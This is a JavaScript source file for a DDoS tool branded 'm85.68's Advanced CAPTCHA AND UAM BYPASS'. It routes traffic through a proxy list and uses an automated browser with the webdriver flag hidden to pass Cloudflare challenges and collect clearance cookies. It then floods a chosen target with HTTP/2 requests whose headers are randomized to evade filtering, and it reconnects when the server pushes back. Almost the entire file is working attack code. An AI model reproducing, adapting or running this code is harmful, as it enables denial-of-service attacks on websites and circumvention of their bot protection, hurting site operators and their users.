const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
  
// Helper function to replace page.waitForTimeout
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));


const COLORS = {
    reset: "\x1b[0m",
    cyan: "\x1b[36m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    yellow: "\x1b[33m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m",
    white: "\x1b[37m",
    bold: "\x1b[1m"
};


const printHeader = () => {
    console.clear();
    console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
    console.log(`${COLORS.cyan}${COLORS.bold}||                 #  m85.68's Advanced  #                  ||${COLORS.reset}`);
    console.log(`${COLORS.cyan}${COLORS.bold}||               #  CAPTCHA AND UAM BYPASS  #               ||${COLORS.reset}`);
    console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
};



// Read proxies from file
function loadProxies(proxyFile) {
    try {
        if (!fs.existsSync(proxyFile)) {
            console.log(`${COLORS.red}ðŸš« Error: Proxy file ${proxyFile} does not exist${COLORS.reset}`);
            process.exit(1);
        }
        const proxyData = fs.readFileSync(proxyFile, 'utf8').trim();
        const proxyList = proxyData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
        if (proxyList.length === 0) {
            console.log(`${COLORS.red}ðŸš« Error: Proxy file ${proxyFile} is empty${COLORS.reset}`);
            process.exit(1);
        }
        console.log(`${COLORS.green}âœ… m85.68: Loaded ${proxyList.length} proxies from ${proxyFile}${COLORS.reset}`);
        return proxyList;
    } catch (err) {
        console.log(`${COLORS.red}ðŸš« Error reading proxy file ${proxyFile}: ${err.message}${COLORS.reset}`);
        process.exit(1);
    }
}

// TLS Configuration
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "X25519:P-256:P-384:P-521";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(':'),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

// Headers arrays
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0'
];

const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9'
];

// Parse arguments
if (process.argv.length < 7) {
    printHeader();
    console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}`);
    console.log(`${COLORS.red}${COLORS.bold}  Usage:${COLORS.reset}`);
    console.log(`${COLORS.white}    node captcha2.js <target> <time> <rate> <threads> <cookieCount> <proxyFile>${COLORS.reset}`);
    console.log(`${COLORS.red}${COLORS.bold}------------------------------------------------------------${COLORS.reset}`);
    console.log(`${COLORS.yellow}${COLORS.bold}  Example:${COLORS.reset}`);
    console.log(`${COLORS.white}    node captcha2.js https://example.com 60 5 4 6 proxy.txt${COLORS.reset}`);
    console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}\n`);
    process.exit(1);
}


const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2,
    proxyFile: process.argv[7]
};

// Load proxies from file
const proxies = loadProxies(args.proxyFile);

const parsedTarget = url.parse(args.target);

// Track failed proxies
global.failedProxies = new Set();

// Proxy index for sequential selection
global.proxyIndex = 0;

// Flood function with proxy
function flood(userAgent, cookie, proxy) {
    try {
        console.log(`${COLORS.cyan}ðŸŒŠ m85.68: Flooding with proxy ${proxy}...${COLORS.reset}`);
        let parsed = url.parse(args.target);
        let path = parsed.path;
        const proxyParts = proxy.split(':');
        const [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts.length === 4 ? proxyParts : [proxyParts[0], proxyParts[1], null, null];

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = 1000; // Changed to 1000ms to reduce rate

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            return match ? match[1] : "126";
        }

        const chromever = getChromeVersion(userAgent);
        const randValue = function(list) { return list[Math.floor(Math.random() * list.length)]; };
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
        ];

        let fixed = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
            "purpure-secretf-id": "formula-" + generateRandomString(1, 2),
            "priority": "u=0, i",
            "te": "trailers"
        };

        let randomHeaders = {
            "purpure-secretf-id": Math.random() < 0.3 ? "formula-" + generateRandomString(1, 2) : undefined,
            "sec-stake-fommunity": Math.random() < 0.5 ? "bet-clc" : undefined,
            "SElF-DYNAMIC": Math.random() < 0.6 ? generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
            "stringclick-bad": Math.random() < 0.6 ? "stringclick-bad-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined,
            "root-user": Math.random() < 0.6 ? "root-user" + generateRandomString(1, 2) + ":root-" + generateRandomString(1, 2) : undefined,
            "Java-x-seft": Math.random() < 0.6 ? "Java-x-seft" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
            "HTTP-requests": Math.random() < 0.6 ? "HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined,
            "C-Boost": Math.random() < 0.3 ? generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
            "sys-nodejs": Math.random() < 0.3 ? "sys-nodejs-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined
        };

        let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "purpure-secretf-id",
            "priority"
        ];

        let headersArray = Object.entries(fixed);
        let shuffledRandomHeaders = Object.entries(randomHeaders).filter(([_, value]) => value !== undefined).sort(() => Math.random() - 0.5);

        shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, _]) => k === insertAfter);
            if (index !== -1) {
                headersArray.splice(index + 1, 0, [key, value]);
            }
        });

        let dynHeaders = {};
        headersArray.forEach(([key, value]) => {
            dynHeaders[key] = value;
        });

        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        function createTunneledConnection(parsed, proxy) {
            return new Promise((resolve, reject) => {
                const proxyParts = proxy.split(':');
                const proxyHost = proxyParts[0];
                const proxyPort = parseInt(proxyParts[1]);
                const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
                const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
                const socket = net.connect({
                    host: proxyHost,
                    port: proxyPort
                });

                socket.on('connect', () => {
                    let connectRequest = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n`;
                    if (proxyUser && proxyPass) {
                        const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
                        connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
                    }
                    connectRequest += '\r\n';

                    socket.write(connectRequest);

                    let responseData = '';
                    socket.on('data', (data) => {
                        responseData += data.toString();
                        if (responseData.indexOf('\r\n\r\n') !== -1) {
                            if (responseData.match(/^HTTP\/1\.[0-1] 200/)) {
                                const tlsSocket = tls.connect({
                                    socket: socket,
                                    servername: parsed.host,
                                    minVersion: "TLSv1.2",
                                    maxVersion: "TLSv1.3",
                                    ALPNProtocols: ["h2"],
                                    rejectUnauthorized: false,
                                    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                                    ecdhCurve: ecdhCurve,
                                    secureOptions: Math.random() < 0.5 ? secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] : undefined
                                }, () => {
                                    resolve(tlsSocket);
                                });

                                tlsSocket.on('error', (err) => {
                                    socket.destroy();
                                    reject(new Error(`TLS error: ${err.message}`));
                                });
                            } else {
                                socket.destroy();
                                reject(new Error(`Proxy rejected CONNECT request: ${responseData.split('\r\n')[0]}`));
                            }
                        }
                    });

                    socket.on('error', (err) => {
                        reject(new Error(`Socket error: ${err.message}`));
                    });
                });

                socket.on('error', (err) => {
                    reject(new Error(`Socket connection error: ${err.message}`));
                });
            });
        }

        console.log(`${COLORS.blue}ðŸ”Œ m85.68: Creating TLS socket for proxy ${proxy}...${COLORS.reset}`);
        createTunneledConnection(parsed, proxy).then((tlsSocket) => {
            const client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
                }
            }, (session) => {
                session.setLocalWindowSize(12517377 + 65535);
            });

            client.on("connect", () => {
                console.log(`${COLORS.green}âœ… m85.68: HTTP/2 connected with proxy ${proxy}${COLORS.reset}`);
                let clearr = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        try {
                            const request = client.request(dynHeaders, {
                                weight: Math.random() < 0.5 ? 42 : 256,
                                depends_on: 0,
                                exclusive: false
                            });

                            request.on('error', (err) => {
                                if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                                    console.log(`${COLORS.red}âŒ m85.68: Request stream error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
                                }
                            });

                            request.end();
                        } catch (reqErr) {
                            if (reqErr.code !== 'NGHTTP2_REFUSED_STREAM') {
                                console.log(`${COLORS.red}âŒ m85.68: Request error with proxy ${proxy}: ${reqErr.message}${COLORS.reset}`);
                            }
                        }
                    }
                }, interval);

                let goawayCount = 0;
                client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                    clearInterval(clearr);
                    let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
                    console.log(`${COLORS.yellow}âš ï¸ m85.68: GOAWAY received for proxy ${proxy}, retrying after ${backoff}ms${COLORS.reset}`);
                    setTimeout(() => {
                        goawayCount++;
                        client.destroy();
                        tlsSocket.destroy();
                        if (!global.failedProxies.has(proxy)) {
                            flood(userAgent, cookie, proxy);
                        }
                    }, backoff);
                });

                client.on("close", () => {
                    clearInterval(clearr);
                    client.destroy();
                    tlsSocket.destroy();
                    console.log(`${COLORS.blue}ðŸ”’ m85.68: Connection closed for proxy ${proxy}${COLORS.reset}`);
                    if (!global.failedProxies.has(proxy)) {
                        flood(userAgent, cookie, proxy);
                    }
                });

                client.on("error", (err) => {
                    clearInterval(clearr);
                    if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                        console.log(`${COLORS.red}âŒ m85.68: Client error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
                    }
                    client.destroy();
                    tlsSocket.destroy();
                    if (err.code !== 'NGHTTP2_REFUSED_STREAM' && !global.failedProxies.has(proxy)) {
                        global.failedProxies.add(proxy);
                    } else if (!global.failedProxies.has(proxy)) {
                        flood(userAgent, cookie, proxy);
                    }
                });
            });

            client.on("error", (err) => {
                if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                    console.log(`${COLORS.red}âŒ m85.68: Client connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
                }
                client.destroy();
                tlsSocket.destroy();
                if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                    global.failedProxies.add(proxy);
                }
            });
        }).catch((err) => {
            console.log(`${COLORS.red}âŒ m85.68: Connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
            if (err.message.includes('429')) {
                console.log(`${COLORS.yellow}âš ï¸ m85.68: 429 Too Many Requests, retrying proxy ${proxy} after 10s${COLORS.reset}`);
                setTimeout(() => flood(userAgent, cookie, proxy), 10000);
            } else {
                global.failedProxies.add(proxy);
            }
        });
    } catch (err) {
        console.log(`${COLORS.red}âŒ m85.68: Error in flood function with proxy ${proxy}: ${err.message}${COLORS.reset}`);
        global.failedProxies.add(proxy);
    }
}

// Helper functions
function getNextProxy(arr) {
    let start = global.proxyIndex || 0;
    for (let i = start; i < start + arr.length; i++) {
        let idx = i % arr.length;
        let item = arr[idx];
        if (!global.failedProxies.has(item.proxy ? item.proxy : item)) {
            global.proxyIndex = (idx + 1) % arr.length;
            return item;
        }
    }
    console.log(`${COLORS.red}ðŸš« m85.68: No available proxies left!${COLORS.reset}`);
    return null;
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters[Math.floor(Math.random() * characters.length)];
    }
    return result;
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = [];
    for (let i = keys.length - 1; i >= 0; i--) {
        const randomIndex = Math.floor(Math.random() * (i + 1));
        shuffledKeys[i] = shuffledKeys[randomIndex];
        shuffledKeys[randomIndex] = keys[i];
    }
    const result = {};
    shuffledKeys.forEach((key) => {
        if (key) result[key] = obj[key];
    });
    return result;
}

// Cloudflare Bypass with proxy
function bypassCloudflareOnce(attemptNum) {
    if (typeof attemptNum === 'undefined') attemptNum = 1;
    let response = null;
    let browser = null;
    let page = null;
    const maxRetries = 3;
    let retryCount = 0;
    let proxy = null;

    function tryBypass(resolve, reject) {
        proxy = getNextProxy(proxies);
        if (!proxy) {
            console.log(`${COLORS.red}ðŸš« m85.68: No valid proxies available for bypass attempt #${attemptNum}!${COLORS.reset}`);
            resolve({
                cookies: [],
                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                cfClearance: null,
                success: false,
                attemptNum: attemptNum,
                proxy: null
            });
            return;
        }

        const proxyParts = proxy.split(':');
        const proxyHost = proxyParts[0];
        const proxyPort = proxyParts[1];
        const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
        const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
        
        try {
            console.log(`${COLORS.yellow}ðŸ” m85.68: Starting bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) using proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
            
            const connectOptions = {
                headless: false,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    `--proxy-server=http://${proxyHost}:${proxyPort}`
                ],
                turnstile: true,
                connectOption: {
                    defaultViewport: null
                }
            };

            if (proxyUser && proxyPass) {
                connectOptions.args.push(`--proxy-auth=${proxyUser}:${proxyPass}`);
            }
            
            connect(connectOptions).then((resp) => {
                response = resp;
                browser = response.browser;
                page = response.page;
                
                page.evaluateOnNewDocument(() => {
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                });
                
                console.log(`${COLORS.blue}ðŸŒ m85.68: Accessing ${args.target} through proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
                
                page.goto(args.target, { 
                    waitUntil: 'domcontentloaded',
                    timeout: 120000
                }).then(() => {
                    console.log(`${COLORS.yellow}ðŸ”Ž m85.68: Checking Cloudflare challenge for ${proxy}...${COLORS.reset}`);
                    
                    let challengeCompleted = false;
                    let checkCount = 0;
                    const maxChecks = 120;
                    
                    function checkChallenge() {
                        if (challengeCompleted || checkCount >= maxChecks) {
                            setTimeout(() => {
                                page.cookies().then((cookies) => {
                                    console.log(`${COLORS.cyan}ðŸª m85.68: Found ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}${COLORS.reset}`);
                                    
                                    const cfClearance = cookies.find((c) => c.name === "cf_clearance");
                                    if (cfClearance) {
                                        console.log(`${COLORS.green}âœ… m85.68: cf_clearance: ${cfClearance.value.substring(0, 30)}...${COLORS.reset}`);
                                    }
                                    
                                    page.evaluate(() => navigator.userAgent).then((userAgent) => {
                                        page.close().then(() => {
                                            browser.close().then(() => {
                                                resolve({
                                                    cookies: cookies,
                                                    userAgent: userAgent,
                                                    cfClearance: cfClearance ? cfClearance.value : null,
                                                    success: true,
                                                    attemptNum: attemptNum,
                                                    proxy: proxy
                                                });
                                            });
                                        });
                                    }).catch((evalError) => {
                                        console.log(`${COLORS.red}âŒ m85.68: Evaluation error after cookies: ${evalError.message}${COLORS.reset}`);
                                        resolve({
                                            cookies: [],
                                            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                            cfClearance: null,
                                            success: false,
                                            attemptNum: attemptNum,
                                            proxy: proxy
                                        });
                                    });
                                }).catch((cookieError) => {
                                    console.log(`${COLORS.red}âŒ m85.68: Cookie retrieval error: ${cookieError.message}${COLORS.reset}`);
                                    resolve({
                                        cookies: [],
                                        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                        cfClearance: null,
                                        success: false,
                                        attemptNum: attemptNum,
                                        proxy: proxy
                                    });
                                });
                            }, 1000);
                            return;
                        }
                        
                        setTimeout(async () => {
                            try {
                                await Promise.race([
                                    page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 5000 }).catch(() => null),
                                    delay(500)
                                ]);

                                const cookies = await page.cookies();
                                const cfClearance = cookies.find((c) => c.name === "cf_clearance");

                                if (cfClearance) {
                                    console.log(`${COLORS.green}âœ… m85.68: Found cookie after ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}!${COLORS.reset}`);
                                    challengeCompleted = true;
                                    checkChallenge();
                                    return;
                                }

                                const result = await page.evaluate(() => {
                                    const title = (document.title || "").toLowerCase();
                                    const bodyText = (document.body && document.body.innerText || "").toLowerCase();
                                    
                                    if (title.indexOf("just a moment") !== -1 || 
                                        title.indexOf("checking") !== -1 ||
                                        bodyText.indexOf("checking your browser") !== -1 ||
                                        bodyText.indexOf("please wait") !== -1 ||
                                        bodyText.indexOf("cloudflare") !== -1) {
                                        return false;
                                    }
                                    
                                    return document.body && document.body.children.length > 3;
                                });

                                challengeCompleted = result;
                                checkCount++;

                                if (checkCount % 10 === 0) {
                                    console.log(`${COLORS.yellow}â³ m85.68: Still checking... (${(checkCount * 0.5).toFixed(1)}s elapsed) for proxy ${proxy}${COLORS.reset}`);
                                }

                                checkChallenge();
                            } catch (evalError) {
                                console.log(`${COLORS.red}âŒ m85.68: Evaluation error: ${evalError.message}${COLORS.reset}`);
                                checkCount++;
                                checkChallenge();
                            }
                        }, 500);
                    }
                    
                    checkChallenge();
                }).catch((navError) => {
                    console.log(`${COLORS.yellow}âš ï¸ m85.68: Access warning for proxy ${proxy}: ${navError.message}${COLORS.reset}`);
                    if (navError.message.includes("net::ERR_INVALID_AUTH_CREDENTIALS") || 
                        navError.message.includes("net::ERR_PROXY_CONNECTION_FAILED")) {
                        global.failedProxies.add(proxy);
                        retryCount++;
                        try {
                            if (page) page.close().then(() => {
                                if (browser) browser.close().then(() => {
                                    if (retryCount < maxRetries) {
                                        tryBypass(resolve, reject);
                                    } else {
                                        resolve({
                                            cookies: [],
                                            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                            cfClearance: null,
                                            success: false,
                                            attemptNum: attemptNum,
                                            proxy: proxy
                                        });
                                    }
                                });
                            });
                        } catch (cleanupError) {
                            console.log(`${COLORS.red}âŒ m85.68: Cleanup error: ${cleanupError.message}${COLORS.reset}`);
                            if (retryCount < maxRetries) {
                                tryBypass(resolve, reject);
                            } else {
                                resolve({
                                    cookies: [],
                                    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                    cfClearance: null,
                                    success: false,
                                    attemptNum: attemptNum,
                                    proxy: proxy
                                });
                            }
                        }
                    } else {
                        retryCount++;
                        if (retryCount < maxRetries) {
                            tryBypass(resolve, reject);
                        } else {
                            resolve({
                                cookies: [],
                                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                cfClearance: null,
                                success: false,
                                attemptNum: attemptNum,
                                proxy: proxy
                            });
                        }
                    }
                });
            }).catch((error) => {
                console.log(`${COLORS.red}âŒ m85.68: Bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) failed with proxy ${proxyHost}:${proxyPort}: ${error.message}${COLORS.reset}`);
                global.failedProxies.add(proxy);
                retryCount++;
                
                try {
                    if (page) page.close().then(() => {
                        if (browser) browser.close().then(() => {
                            if (retryCount < maxRetries) {
                                tryBypass(resolve, reject);
                            } else {
                                resolve({
                                    cookies: [],
                                    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                    cfClearance: null,
                                    success: false,
                                    attemptNum: attemptNum,
                                    proxy: proxy
                                });
                            }
                        });
                    });
                } catch (cleanupError) {
                    console.log(`${COLORS.red}âŒ m85.68: Cleanup error: ${cleanupError.message}${COLORS.reset}`);
                    if (retryCount < maxRetries) {
                        tryBypass(resolve, reject);
                    } else {
                        resolve({
                            cookies: [],
                            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            cfClearance: null,
                            success: false,
                            attemptNum: attemptNum,
                            proxy: proxy
                        });
                    }
                }
            });
        } catch (error) {
            console.log(`${COLORS.red}âŒ m85.68: Bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) failed with proxy ${proxyHost}:${proxyPort}: ${error.message}${COLORS.reset}`);
            global.failedProxies.add(proxy);
            retryCount++;
            
            if (retryCount < maxRetries) {
                tryBypass(resolve, reject);
            } else {
                resolve({
                    cookies: [],
                    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    cfClearance: null,
                    success: false,
                    attemptNum: attemptNum,
                    proxy: proxy
                });
            }
        }
    }

    return new Promise((resolve, reject) => {
        tryBypass(resolve, reject);
    });
}

function bypassCloudflareParallel(totalCount) {
    return new Promise((resolve, reject) => {
        console.log(`${COLORS.magenta}ðŸ” m85.68: Starting Cloudflare Bypass ðŸ”${COLORS.reset}`);
        console.log(`${COLORS.cyan}ðŸŽ¯ m85.68: Target cookie count: ${totalCount}${COLORS.reset}`);
        
        const results = [];
        let attemptCount = 0;
        const concurrentBypassSessions = 10;
        
        function runBatch() {
            const remaining = totalCount - results.length;
            const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
            
            console.log(`\n${COLORS.yellow}ðŸš€ m85.68: Starting parallel batch (${currentBatchSize} sessions)...${COLORS.reset}`);
            
            const batchPromises = [];
            for (let i = 0; i < currentBatchSize; i++) {
                attemptCount++;
                batchPromises.push(bypassCloudflareOnce(attemptCount));
            }
            
            Promise.all(batchPromises).then((batchResults) => {
                batchResults.forEach((result) => {
                    if (result.success && result.cookies.length > 0) {
                        results.push(result);
                        console.log(`${COLORS.green}âœ… m85.68: Session #${result.attemptNum} successful with proxy ${result.proxy}! (Total: ${results.length}/${totalCount})${COLORS.reset}`);
                    } else {
                        console.log(`${COLORS.red}âŒ m85.68: Session #${result.attemptNum} failed with proxy ${result.proxy}${COLORS.reset}`);
                    }
                });
                
                if (results.length < totalCount) {
                    console.log(`${COLORS.yellow}â³ m85.68: Waiting 2s before next batch...${COLORS.reset}`);
                    setTimeout(runBatch, 2000);
                } else {
                    if (results.length === 0) {
                        console.log(`${COLORS.yellow}âš ï¸ m85.68: No Cloudflare cookies obtained, using default header${COLORS.reset}`);
                        results.push({
                            cookies: [],
                            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            cfClearance: null,
                            success: true,
                            proxy: getNextProxy(proxies)
                        });
                    }
                    
                    console.log(`\n${COLORS.green}ðŸŽ‰ m85.68: Total sessions obtained: ${results.length}${COLORS.reset}`);
                    resolve(results);
                }
            }).catch((batchError) => {
                console.log(`${COLORS.red}âŒ m85.68: Error in batch processing: ${batchError.message}${COLORS.reset}`);
                setTimeout(runBatch, 2000);
            });
        }
        
        runBatch();
    });
}

// Run flooder function
function runFlooder() {
    const bypassInfo = getNextProxy(global.bypassData || []);
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies && bypassInfo.cookies.length > 0 ? bypassInfo.cookies.map((c) => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    const proxy = bypassInfo.proxy;
    if (!proxy || global.failedProxies.has(proxy)) return;
    
    console.log(`${COLORS.cyan}ðŸŒŠ m85.68: Running flooder with proxy ${proxy}...${COLORS.reset}`);
    flood(userAgent, cookieString, proxy);
}

// Initialize global stats
global.startTime = Date.now();
global.bypassData = [];
